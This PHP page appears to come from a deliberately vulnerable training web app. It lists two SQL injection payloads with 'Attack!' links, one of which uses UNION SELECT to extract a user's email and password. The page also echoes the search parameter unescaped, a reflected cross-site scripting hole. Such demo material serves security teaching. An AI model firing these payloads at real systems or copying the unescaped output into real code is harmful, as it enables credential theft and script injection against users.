<?php
include_once("init.php");


$search = $_GET['keyword'];



$products[0] = array(
    "name" => "SQL Injection",
    "description" => "Show value of item 2 instead of nothing",
    "value" => "0' OR id=2 --",
    "attack" => "product.php?id=0'%20OR%20id=2--"
); 

$products[1] = array(
    "name" => "SQL Injection",
    "description" => "Show email and password for a user with id 1",
    "value" => "0' UNION SELECT 'bla', email as name, pw as description, 'bla', 'bla','bla' FROM users WHERE id=1 --",
    "attack" => "product.php?id=0'%20UNION%20SELECT%20'bla',%20email%20as%20name,%20pw%20as%20description,%20'bla',%20'bla','bla'%20FROM%20users%20WHERE%20id=1%20%20--"
); 

 

?>

 <?
	 include_once("header.php");
 ?>

	    <div class="row listing-row">
		    <div class="col s12 m10 offset-m1 ">  
			    <div class="card-panel">     
				    <h4>Search results for: <?=$search?></h4>
                    <table class=" highlight stripped responsive-table listing">
                        <thead>
                            <tr>
                                <th data-field="name">Name</th>
                                <th data-field="description">Description</th>
                                <th data-field="value"> Value</th>
                                <th data-field="attack"> Attack!</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach($products as $product): ?>
                            <tr>
                                <td><?php echo $product['name']; ?></td>
                                <td><?php echo $product['description']; ?></td>
                                <td><?php echo $product['value'];?></td>
                                <td><a class="waves-effect waves-light btn btn-small red darken-2" href="<?=$product['attack']?>" rel="_target">Attack!</a</td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                   </div>
            </div>
            
        </div>   
        
 <?
	 include_once("footer.php");
 ?>
             
 
